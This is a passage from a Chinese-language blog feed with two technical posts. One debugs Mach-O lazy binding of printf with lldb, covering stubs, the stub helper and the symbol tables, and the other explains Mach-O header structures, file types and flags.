retq</span><br></pre></td></tr></table></figure>
<p>在<code>0x100000f52 &lt;+34&gt;</code>行处通过<code>callq 0x100000f64</code>来调用printf。</p>
<p>执行<code>callq</code>指令之后代码跳转到这里：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`<span class="built_in">printf</span>:</span><br><span class="line">-&gt;  <span class="number">0x100000f56</span> &lt;+<span class="number">0</span>&gt;: jmpq   *<span class="number">0xb4</span>(%rip)               ; (<span class="keyword">void</span> *)<span class="number">0x0000000100000f6c</span></span><br></pre></td></tr></table></figure>
<h2 id="1-2___Data,__la_symbol_ptr_获取函数地址">1.2 __Data,__la_symbol_ptr 获取函数地址</h2><p>这里的jmpq要跳转到<code>0x0000000100000f6c</code>这个地址是从__Data,__la_symbol_ptr中的Lazy Symbol Pointers中获取到的。(怎么来的不是很清楚？)希望通过stub来调用printf函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/lazysymbolpointers.png?1" alt=""></p>
<p>通过命令行查看<code>0x100001010</code>处的地址获得了同样的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x <span class="number">0x100001010</span></span><br><span class="line"><span class="number">0x100001010</span>: <span class="number">6</span>c <span class="number">0f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  l...............</span><br><span class="line"><span class="number">0x100001020</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br></pre></td></tr></table></figure>
<h2 id="1-3_通过__stub__helper进行lazybind">1.3 通过__stub__helper进行lazybind</h2><p>在Mach-O中每一个Symbol Stub可能有以下两种行为其中之一：</p>
<ul>
<li>跳转到函数的指令，执行函数体</li>
<li>通过动态链接器查找函数的Symbol(符号)，然后执行函数。</li>
</ul>
<p>通过工具查看__stubs的Section数据，发现只有一个函数就是_printf。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/_stub.png" alt="__TEXT,__stubs"></p>
<p>这里的Data其实就是上面看到的<code>jmpq</code>代码。执行之后代码跳转到了这样的代码片段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-&gt;  <span class="number">0x100000f6c</span>: pushq  $<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x100000f71</span>: jmp    <span class="number">0x100000f5c</span></span><br><span class="line">    <span class="number">0x100000f76</span>: gs     				;这里往下都没有！！！！</span><br><span class="line">    <span class="number">0x100000f78</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f79</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f7a</span>: outsl  (%rsi), %dx</span><br><span class="line">    <span class="number">0x100000f7b</span>: subb   $<span class="number">0x20</span>, %al</span><br><span class="line">    <span class="number">0x100000f7d</span>: pushq  %rdi</span><br><span class="line">    <span class="number">0x100000f7e</span>: outsl  (%rsi), %dx</span><br><span class="line">    <span class="number">0x100000f7f</span>: jb     <span class="number">0x100000fed</span></span><br><span class="line">    <span class="number">0x100000f81</span>: andl   %ecx, %fs:(%rdx)</span><br><span class="line">    <span class="number">0x100000f84</span>: addb   %dh, (%rdx)</span><br><span class="line">    <span class="number">0x100000f86</span>: gs     </span><br><span class="line">    <span class="number">0x100000f88</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f89</span>: insb   %dx, %es:(%rdi)</span><br><span class="line">    <span class="number">0x100000f8a</span>: outsl  (%rsi), %dx</span><br></pre></td></tr></table></figure>
<p>这里就是通过_stub_helper来调用dyld_stub<em>binder函数来计算printf函数的真实地址。通过下面的\</em>_TEXT,__stub_helper具体信息可以看出，jmpq 0x100000f5c,就是在压入参数0x0(函数的link的时候给的编号)之后跳转到Section的起始处，调用了binder。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/_stub_helper.png?1" alt="_stub_helper.png"></p>
<p>binder是一块汇编代码。这里就不做解释了。作用就是计算具体的函数地址，并调用printf。</p>
<h2 id="1-4_第二次调用printf函数">1.4 第二次调用printf函数</h2><p>这个释放断点，程序将在调用第二个printf函数的地方停下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`main:</span><br><span class="line">    <span class="number">0x100000f10</span> &lt;+<span class="number">0</span>&gt;:  pushq  %rbp</span><br><span class="line">    <span class="number">0x100000f11</span> &lt;+<span class="number">1</span>&gt;:  movq   %rsp, %rbp</span><br><span class="line">    <span class="number">0x100000f14</span> &lt;+<span class="number">4</span>&gt;:  subq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f18</span> &lt;+<span class="number">8</span>&gt;:  leaq   <span class="number">0x57</span>(%rip), %rax          ; <span class="string">"Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f1f</span> &lt;+<span class="number">15</span>&gt;: movl   $<span class="number">0x0</span>, -<span class="number">0x4</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f26</span> &lt;+<span class="number">22</span>&gt;: movl   %edi, -<span class="number">0x8</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f29</span> &lt;+<span class="number">25</span>&gt;: movq   %rsi, -<span class="number">0x10</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f2d</span> &lt;+<span class="number">29</span>&gt;: movq   %rax, %rdi</span><br><span class="line">    <span class="number">0x100000f30</span> &lt;+<span class="number">32</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">    <span class="number">0x100000f32</span> &lt;+<span class="number">34</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f37</span> &lt;+<span class="number">39</span>&gt;: leaq   <span class="number">0x47</span>(%rip), %rdi          ; <span class="string">"2Hello, World!\n"</span></span><br><span class="line">    <span class="number">0x100000f3e</span> &lt;+<span class="number">46</span>&gt;: movl   %eax, -<span class="number">0x14</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f41</span> &lt;+<span class="number">49</span>&gt;: movb   $<span class="number">0x0</span>, %al</span><br><span class="line">-&gt;  <span class="number">0x100000f43</span> &lt;+<span class="number">51</span>&gt;: callq  <span class="number">0x100000f56</span>               ; symbol stub <span class="keyword">for</span>: <span class="built_in">printf</span></span><br><span class="line">    <span class="number">0x100000f48</span> &lt;+<span class="number">56</span>&gt;: xorl   %ecx, %ecx</span><br><span class="line">    <span class="number">0x100000f4a</span> &lt;+<span class="number">58</span>&gt;: movl   %eax, -<span class="number">0x18</span>(%rbp)</span><br><span class="line">    <span class="number">0x100000f4d</span> &lt;+<span class="number">61</span>&gt;: movl   %ecx, %eax</span><br><span class="line">    <span class="number">0x100000f4f</span> &lt;+<span class="number">63</span>&gt;: addq   $<span class="number">0x20</span>, %rsp</span><br><span class="line">    <span class="number">0x100000f53</span> &lt;+<span class="number">67</span>&gt;: popq   %rbp</span><br><span class="line">    <span class="number">0x100000f54</span> &lt;+<span class="number">68</span>&gt;: retq</span><br></pre></td></tr></table></figure>
<p>执行指令之后发现和第一次调用printf已经不一样了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazy_bind`<span class="built_in">printf</span>:</span><br><span class="line">-&gt;  <span class="number">0x100000f56</span> &lt;+<span class="number">0</span>&gt;: jmpq   *<span class="number">0xb4</span>(%rip)               ; (<span class="keyword">void</span> *)<span class="number">0x00007fff96b1815c</span>: <span class="built_in">printf</span></span><br></pre></td></tr></table></figure>
<p>通过指令再一次查看<code>0x100001010</code>处的内存值。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(lldb) x <span class="number">0x100001010</span></span><br><span class="line"><span class="number">0x100001010</span>: <span class="number">5</span>c <span class="number">81</span> b1 <span class="number">96</span> ff <span class="number">7f</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  \...............</span><br><span class="line"><span class="number">0x100001020</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  ................</span><br></pre></td></tr></table></figure>
<p>也就是说 __Data,__la_symbol_ptr中指向printf地址的值已经发生了变化，指向了printf的指令。</p>
<h2 id="1-5_小结">1.5 小结</h2><p>证明了，延迟绑定只会在第一次调用的时候发生。整个流程与linux中的PLT与GOT在实现逻辑上基本是相同的，只是具体的代码实现不一样。</p>
<h1 id="0x02_相关LoadCommand">0x02 相关LoadCommand</h1><p>上面只是通过调试简单的了解了动态链接的表现，要理解动态链接还需对几个数据结构有所了解。</p>
<h2 id="2-1_LC_SYMTAB">2.1 LC_SYMTAB</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/LC_SYMTAB.png?1" alt="LC_SYMTAB"></p>
<p>LC_SYMTAB这个LoadCommand主要提供了两个信息</p>
<ul>
<li>Symbol Table的偏移量与Symbol Table中元素的个数</li>
<li>String Table的偏移量与String Table的长度</li>
</ul>
<h3 id="2-1-1_Symbol_Table">2.1.1 Symbol Table</h3><blockquote>
<p>在计算机科学中，符号表是一种用于语言翻译器（例如编译器和解释器）中的数据结构。在符号表中，程序源代码中的每个标识符都和它的声明或使用信息绑定在一起，比如其数据类型、作用域以及内存地址。</p>
<p>–wiki</p>
</blockquote>
<p>简单的理解就是Symbol Table里面包含了所有会被调用的函数的信息，无论是已经bind的还是没有bind的函数。</p>
<h3 id="2-2-2_String_Table">2.2.2 String Table</h3><p>这个很好理解，在符号处理时所有会用到的字符串放在了这里。和__TEXT,__cstring不同。</p>
<h2 id="2-2_LC_DYSYMTAB">2.2 LC_DYSYMTAB</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-DYLD-HOOK/LC_DYSYMTAB.png" alt="LC_DYSYMTAB"></p>
<p>LC_DYSYMTAB的数据结构，如图所示。这一个LoadCommand与动态链接相关的就是红框标出的两个字段，标示了需要动态符号表的偏移量与符号个数。</p>
<p>动态符号表的数据结构非常的简单，是一个32bit的索引的数组。通过索引可以在Symbol Table中寻找到对应的函数信息。</p>
<h1 id="0x03_小结">0x03 小结</h1><p>通过分析两次printf的调用流程，加深对Mach-O结构以及动态链接的流程理解，为进一步理解dyld的工作原理，源码阅读提供了知识的储备。</p>
<p>通过和Linux的PTL与GOT比较可以更容易理解逻辑。</p>
<p>整个流程是如何通过代码实现的还需要进一步的分析与研究。</p>
<h1 id="0x04_参考">0x04 参考</h1><p>1.Dynamic Linking: ELF vs. Mach-O</p>
<p><a href="http://timetobleed.com/dynamic-linking-elf-vs-mach-o/" target="_blank" rel="external">http://timetobleed.com/dynamic-linking-elf-vs-mach-o/</a></p>
<p>2.Dynamic symbol table duel: ELF vs Mach-O, round 2</p>
<p><a href="http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/" target="_blank" rel="external">http://timetobleed.com/dynamic-symbol-table-duel-elf-vs-mach-o-round-2/</a></p>
<h1 id="PS:">PS:</h1><p>更多文章可以在我的学习分享博客<a href="http://BLOGIMAGE/" target="_blank" rel="external">http://BLOGIMAGE/</a></p>
<p>希望可以多多交流，不足之处还希望大家可以给与指正：）</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>通过分析<code>Mach-O</code>的动态链接过程，加深对<code>Mach-O</code>文件结构的理解。对Mach-O文件格式的简单的分析看这里<a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">这里</a>。</p>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://yoursite.com/tags/dyld/"/>
    
      <category term="dynamic link" scheme="http://yoursite.com/tags/dynamic-link/"/>
    
      <category term="mach-o" scheme="http://yoursite.com/tags/mach-o/"/>
    
      <category term="osx" scheme="http://yoursite.com/tags/osx/"/>
    
      <category term="OS X" scheme="http://yoursite.com/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mach-o格式分析]]></title>
    <link href="http://yoursite.com/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/03/07/mach-o文件格式分析/</id>
    <published>2016-03-07T16:18:09.000Z</published>
    <updated>2016-03-24T03:37:29.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><blockquote>
<p>人生无根蒂，飘如陌上尘。 分散逐风转，此已非常身。</p>
<p>— 陶渊明 《杂诗》</p>
</blockquote>
<p><code>mach-o</code>格式是OS X系统上的可执行文件格式，类似于windows的<code>PE</code>与linux的<code>ELF</code>，如果不彻底搞清楚<code>mach-o</code>的格式与相关知识，去做其他研究，无异于建造空中阁楼。</p>
<p>每个Mach-O文件斗包含一个Mach-O头，然后是载入命令(Load Commands),最后是数据块(Data)。</p>
<p>接下来就对整个Mach-O的格式做出详细的分析。</p>
<a id="more"></a>
<h1 id="0x01_Mach-O格式简单介绍">0x01 Mach-O格式简单介绍</h1><p>Mach-O文件的格式如下图所示：</p>
<p><img src="http://www.codeproject.com/KB/recipes/dynamic_linking-in-mach-o/im1.jpg" alt="Mach-O"></p>
<p>又如下几个部分组成：</p>
<ul>
<li>Header：保存了Mach-O的一些基本信息，包括了平台、文件类型、LoadCommands的个数等等。</li>
<li>LoadCommands：这一段紧跟Header，加载Mach-O文件时会使用这里的数据来确定内存的分布。</li>
<li>Data：每一个segment的具体数据都保存在这里，这里包含了具体的代码、数据等等。</li>
</ul>
<h1 id="0x02_Headers">0x02 Headers</h1><h2 id="2-1_数据结构">2.1 数据结构</h2><p>Headers的定义可以在开源的内核代码中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> * The 32-bit mach header appears at the very beginning of the object file for</span><br><span class="line"> * 32-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> mach_header &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></span><br><span class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></span><br><span class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Constant for the magic field of the mach_header (32-bit architectures) */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_MAGIC	<span class="number">0xfeedface</span>	<span class="comment">/* the mach magic number */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_CIGAM	<span class="number">0xcefaedfe</span>	<span class="comment">/* NXSwapInt(MH_MAGIC) */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span><br><span class="line"> * The 64-bit mach header appears at the very beginning of object files for</span><br><span class="line"> * 64-bit architectures.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">struct</span> mach_header_64 &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;		<span class="comment">/* mach magic number identifier */</span></span><br><span class="line">	<span class="keyword">cpu_type_t</span>	cputype;	<span class="comment">/* cpu specifier */</span></span><br><span class="line">	<span class="keyword">cpu_subtype_t</span>	cpusubtype;	<span class="comment">/* machine specifier */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	filetype;	<span class="comment">/* type of file */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	ncmds;		<span class="comment">/* number of load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	sizeofcmds;	<span class="comment">/* the size of all the load commands */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	flags;		<span class="comment">/* flags */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reserved;	<span class="comment">/* reserved */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Constant for the magic field of the mach_header_64 (64-bit architectures) */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_MAGIC_64 <span class="number">0xfeedfacf</span> <span class="comment">/* the 64-bit mach magic number */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_CIGAM_64 <span class="number">0xcffaedfe</span> <span class="comment">/* NXSwapInt(MH_MAGIC_64) */</span></span></span><br></pre></td></tr></table></figure>
<p>根据<code>mach_header</code>与<code>mach_header_64</code>的定义，很明显可以看出，Headers的主要作用就是帮助系统迅速的定位Mach-O文件的运行环境，文件类型。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/Header.png" alt="Header"></p>
<h2 id="2-2_实例">2.2 实例</h2><p>使用工具分析一个mach-o文件来具体的看一下Mach-O Headers。</p>
<p>通过otool可以得到Mach header的具体的情况，但是可读性略微有一点差。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  bin otool -h git</span><br><span class="line">git:</span><br><span class="line">Mach header</span><br><span class="line">      magic cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags</span><br><span class="line"> <span class="number">0xfeedfacf</span> <span class="number">16777223</span>          <span class="number">3</span>  <span class="number">0x80</span>           <span class="number">2</span>    <span class="number">17</span>       <span class="number">1432</span> <span class="number">0x00200085</span></span><br></pre></td></tr></table></figure>
<p>还有一个工具是MachOview可以看的更清楚一点。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/macho_header.png" alt="Header"></p>
<ul>
<li>MagicNumber的值为0xFEEDFACF所以该文件是一个64位平台上的文件</li>
<li>CPU Type和CPU SubType也很容易理解，运行在X86_64的CPU平台上</li>
<li>File Type标示了该文件是一个可执行文件，后面具体分析</li>
<li>Flags标示了这个MachO文件的四个特性，后面具体分析</li>
</ul>
<h2 id="2-3_具体参数">2.3 具体参数</h2><h3 id="2-3-1_FileType">2.3.1 FileType</h3><p>因为Mach-O文件不仅仅用来实现可执行文件，同时还用来实现了其他内容</p>
<ul>
<li>内核扩展</li>
<li>库文件</li>
<li>CoreDump</li>
<li>…</li>
</ul>
<p>他的源码定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_OBJECT	<span class="number">0x1</span>		<span class="comment">/* relocatable object file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_EXECUTE	<span class="number">0x2</span>		<span class="comment">/* demand paged executable file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_FVMLIB	<span class="number">0x3</span>		<span class="comment">/* fixed VM shared library file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_CORE		<span class="number">0x4</span>		<span class="comment">/* core file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_PRELOAD	<span class="number">0x5</span>		<span class="comment">/* preloaded executable file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLIB	<span class="number">0x6</span>		<span class="comment">/* dynamically bound shared library */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLINKER	<span class="number">0x7</span>		<span class="comment">/* dynamic link editor */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_BUNDLE	<span class="number">0x8</span>		<span class="comment">/* dynamically bound bundle file */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DYLIB_STUB	<span class="number">0x9</span>		<span class="comment">/* shared library stub for static */</span></span></span><br><span class="line">					<span class="comment">/*  linking only, no section contents */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_DSYM		<span class="number">0xa</span>		<span class="comment">/* companion file with only debug */</span></span></span><br><span class="line">					<span class="comment">/*  sections */</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_KEXT_BUNDLE	<span class="number">0xb</span>		<span class="comment">/* x86_64 kexts */</span></span></span><br></pre></td></tr></table></figure>
<p>解释一下一些常用到的文件类型。</p>
<table>
<thead>
<tr>
<th>File Type</th>
<th>用处</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr>
<td>MH_OBJECT</td>
<td>编译过程中产生的*.obj文件</td>
<td>gcc -c xxx.c 生成xxx.o文件</td>
</tr>
<tr>
<td>MH_EXECUTABLE</td>
<td>可执行二进制文件</td>
<td>/usr/bin/git</td>
</tr>
<tr>
<td>MH_CORE</td>
<td>CoreDump</td>
<td>崩溃时的Dump文件</td>
</tr>
<tr>
<td>MH_DYLIB</td>
<td>动态库</td>
<td>/usr/lib/里面的那些库文件</td>
</tr>
<tr>
<td>MH_DYLINKER</td>
<td>连接器linker</td>
<td>/usr/lib/dyld文件</td>
</tr>
<tr>
<td>MH_KEXT_BUNDLE</td>
<td>内核扩展文件</td>
<td>自己开发的简单内核模块</td>
</tr>
</tbody>
</table>
<h3 id="2-3-2_flags">2.3.2 flags</h3><p>Mach-O headers还包含了一些很重要的dyld的加载参数。代码中的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span>	MH_INCRLINK	<span class="number">0x2</span>		<span class="comment">/* the object file is the output of an</span><br><span class="line">					   incremental link against a base file</span><br><span class="line">					   and can't be link edited again */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_DYLDLINK	<span class="number">0x4</span>		<span class="comment">/* the object file is input for the</span><br><span class="line">					   dynamic linker and can't be staticly</span><br><span class="line">					   link edited again */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_BINDATLOAD	<span class="number">0x8</span>		<span class="comment">/* the object file's undefined</span><br><span class="line">					   references are bound by the dynamic</span><br><span class="line">					   linker when loaded. */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_PREBOUND	<span class="number">0x10</span>		<span class="comment">/* the file has its dynamic undefined</span><br><span class="line">					   references prebound. */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_SPLIT_SEGS	<span class="number">0x20</span>		<span class="comment">/* the file has its read-only and</span><br><span class="line">					   read-write segments split */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_LAZY_INIT	<span class="number">0x40</span>		<span class="comment">/* the shared library init routine is</span><br><span class="line">					   to be run lazily via catching memory</span><br><span class="line">					   faults to its writeable segments</span><br><span class="line">					   (obsolete) */</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MH_TWOLEVEL	<span class="number">0x80</span>		<span class="comment">/* the image is using two-level name</span><br><span class="line">					   space bindings */</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//太长，有兴趣可以自己看源码</span></span><br><span class="line"><span class="comment">// EXTERNAL_HEADERS/mach-o/x86_64/loader.h</span></span><br></pre></td></tr></table></figure>
<p>同样简单的介绍几个比较重要的。</p>
<table>
<thead>
<tr>
<th>Flag Type</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>MH_NOUNDEFS</td>
<td>目标没有未定义的符号，不存在链接依赖</td>
</tr>
<tr>
<td>MH_DYLDLINK</td>
<td>该目标文件是dyld的输入文件，无法被再次的静态链接</td>
</tr>
<tr>
<td>MH_PIE</td>
<td>允许随机的地址空间</td>
</tr>
<tr>
<td>MH_ALLOW_STACK_EXECUTION</td>
<td>栈内存可执行代码，一般是默认关闭的。</td>
</tr>
<tr>
<td>MH_NO_HEAP_EXECUTION</td>
<td>堆内存无法执行代码</td>
</tr>
</tbody>
</table>
<h2 id="2-4_Headers小结">2.4 Headers小结</h2><p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/Mach-O-fmt/Header_butter_fly.png" alt="Headers"></p>
<h1 id="0x03_Load_Commands">0x03 Load Commands</h1><p>这是load_command的数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> load_command &#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> cmd;		<span class="comment">/* type of load command */</span></span><br><span class="line">	<span class="keyword">uint32_t</span> cmdsize;	<span class="comment">/* total size of command in bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>Load Commands 直接就跟在Header后面，所有command占用内存的<strong>总和</strong>在Mach-O Header里面已经给出了。在加载过Header之后就是通过解析LoadCommand来加载接下来的数据了。我简单的看了一下内核中是如何解析macho数据的，抛开内核的实现细节，逻辑其实也十分简单。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 